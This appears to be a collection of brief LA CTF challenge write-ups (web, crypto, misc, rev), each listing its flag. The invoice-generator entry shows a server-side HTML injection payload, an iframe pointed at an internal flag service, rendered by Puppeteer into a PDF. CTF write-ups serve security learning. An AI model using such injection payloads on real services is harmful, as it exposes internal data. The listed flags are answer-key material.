# rev/ooo
[ooo.py](ooo.py)


# web/the-trial
https://the-trial.chall.lac.tf/

Console
1. for (let i = 0; i < 1000; i++) clearInterval(i);
2. disp.textContent = "flag";
3. submit

lactf{gregor_samsa_awoke_from_wait_thats_the_wrong_book}



# misc/endians
[gen.py](gen.py)
[chall.txt](chall.txt)

endian = text.encode("utf-16le").decode("utf-8")
python or cyberchef
lactf{1_sur3_h0pe_th1s_d0es_n0t_g3t_l0st_1n_translati0n!}


# web/mutation mutation
https://mutation-mutation.chall.lac.tf/
1. menu - more tools - developer tools
2. source - pause
3. find out:
```
lactf{с0nѕtаnt_mutаtі0n_1s_fun!_🧬_👋🏽_ІlІ1| ض픋ԡೇ∑ᦞ୞땾᥉༂↗ۑீ᤼യ⌃±❣Ӣ◼ௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌ}
```

# crypto/smol cats
[cat.py](cat.py)
[cat.png](cat.png)

RSA prob, n is not a prime

lactf{sm0l_pr1m3s_4r3_n0t_s3cur3}

# crypto/six seven
[67.py](67.py)
[67crash.py](67crash.py)

lactf{wh4t_67s_15_blud_f4ct0r1ng_15_blud_31nst31n}

# crypto/lazy-bigrams
[bigrams.py](bigrams.py)
[bigramcrash.py](bigramcrash.py)
[ct.txt](ct.txt)

Use a known-plaintext **`lactf{`** attack to build a one-to-one bigram mapping between ciphertext and plaintext, partially automate and partially hand-recover the phonetic string, then reverse the NATO phonetic encoding twice to obtain the final flag.


lactf{n0t_r34lly_4_b1gr4m_su8st1tu7ion_bu7_1_w1ll_tak3_1t_f0r_n0w}

# web/lactf-invoice-generator
[invoice-1770452060823.pdf](invoice-1770452060823.pdf)
[dist](dist)

Server-Side HTML Injection
User input is directly interpolated into the HTML template without sanitization, allowing injection of arbitrary HTML. Since Puppeteer renders this HTML server-side inside a Docker network, an injected iframe can access the internal flag service and embed the flag into the generated PDF.


in invoice-generator/server.js:
```
await page.setContent(invoiceHTML, { waitUntil: "load" });
...
generateInvoiceHTML():
<td>${item}</td>
```
input
```
<iframe src="http://flag:8081/flag"></iframe>
```
will be treated as a HTML element invoiceHTML

```
<td>
  <iframe src="http://flag:8081/flag"></iframe>
</td>
```

1. docker-compose up
<iframe src="http://flag:8081/flag" style="width:100%;height:200px"></iframe>

lactf{plz_s4n1t1z3_y0ur_purch4s3_l1st}